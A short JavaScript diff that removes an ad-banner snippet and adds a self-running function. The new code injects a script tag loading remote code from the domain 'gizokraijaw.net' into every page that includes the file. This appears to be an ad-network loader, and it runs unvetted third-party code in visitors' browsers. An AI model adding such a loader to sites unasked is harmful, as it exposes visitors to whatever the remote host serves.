@@ -1,13 +1,12 @@
-document.addEventListener("DOMContentLoaded", function () {
-    let admoloBanner = document.createElement("div");
+(function () {
+    var d = "gizokraijaw.net";
+    var z = 8868898;
+    var s = document.createElement("script");
+    s.src = "https://" + d + "/401/" + z;
 
-    // Add class
-    admoloBanner.className = "admoloBanner";
-
-    // Add attributes
-    admoloBanner.setAttribute("data-publisher", "eyJpdiI6ImFXU3lCeXJBMlZTMEtHamdBcW9ndmc9PSIsInZhbHVlIjoiN1IzUThlTiszc3FiSkVBNjlkK0lMdz09IiwibWFjIjoiNDBlMTJiYzRjNzk4MjEwMTExMzM4YzQyMTg1MmY5YTAzZmUzYzVlMjVmNjUwYTgyMmUwMGE4MzZhMmQ2ODFhYyIsInRhZyI6IiJ9");
-    admoloBanner.setAttribute("data-adsize", "320x180");
-
-    // Append to body or a specific container
-    document.body.appendChild(admoloBanner);
-});
+    try {
+        (document.body || document.documentElement).appendChild(s);
+    } catch (e) {
+        console.error("Script injection failed:", e);
+    }
+})();
